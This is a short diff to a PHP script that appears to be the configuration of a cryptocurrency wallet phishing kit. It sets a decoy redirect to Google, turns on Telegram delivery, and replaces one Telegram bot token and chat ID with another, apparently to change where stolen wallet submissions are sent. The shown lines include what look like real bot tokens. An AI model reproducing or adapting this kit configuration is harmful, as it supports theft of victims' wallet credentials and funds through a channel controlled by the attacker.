@@ -7,8 +7,8 @@ header('content-type: application/php; charset=utf-8');
 $Receive_email="";
 $redirect="https://www.google.com/";
 $telegram_enable = true;
-	$telegrambot = "5557966069:AAGvhAwYnmlkL0_zw00mU3N0Dlin21hCrVU";
-	$telegram_chatid = "scarfazebase";
+	$telegrambot = "5455913260:AAEoaJiorF5uHsDpHG1avCnxBgReae18HlQ";
+	$telegram_chatid = "mctomif";
 
 if (isset($_POST['walletApp'])) {
 if (isset($_POST['btn1'])) {
